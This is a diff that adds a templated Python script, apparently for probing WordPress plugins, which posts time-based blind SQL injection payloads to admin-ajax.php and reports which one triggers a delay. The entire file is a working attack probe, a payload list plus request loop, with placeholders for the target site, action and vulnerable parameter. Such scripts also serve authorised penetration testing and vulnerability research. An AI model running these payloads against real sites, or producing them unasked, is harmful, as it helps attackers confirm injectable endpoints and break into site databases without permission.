@@ -1,0 +1,35 @@
+import requests, time
+
+TARGET = "{{ target_url }}"
+ACTION = "{{ ajax_action }}"
+PARAM  = "{{ injectable_param }}"
+
+PAYLOADS = [
+    "' AND SLEEP(5)-- -",
+    "' OR SLEEP(5)-- -",
+    "%' AND SLEEP(5)-- -",
+    "%' OR SLEEP(5)#",
+    "1 AND SLEEP(5)",
+    "1; SELECT SLEEP(5)-- -",
+]
+
+def test(payload: str) -> tuple[bool, float]:
+    start = time.time()
+    resp = requests.post(
+        f"{TARGET}/wp-admin/admin-ajax.php",
+        data={"action": ACTION, PARAM: payload},
+        timeout=30,
+    )
+    elapsed = time.time() - start
+    return elapsed > 4.0, elapsed
+
+if __name__ == "__main__":
+    print(f"[*] Testing SQLi: action={ACTION} param={PARAM}")
+    for p in PAYLOADS:
+        ok, t = test(p)
+        if ok:
+            print(f"[+] SUCCESS payload={p!r} delay={t:.1f}s")
+            break
+        print(f"[-] No delay ({t:.1f}s): {p!r}")
+    else:
+        print("[!] FAILURE: no SQLi confirmed")
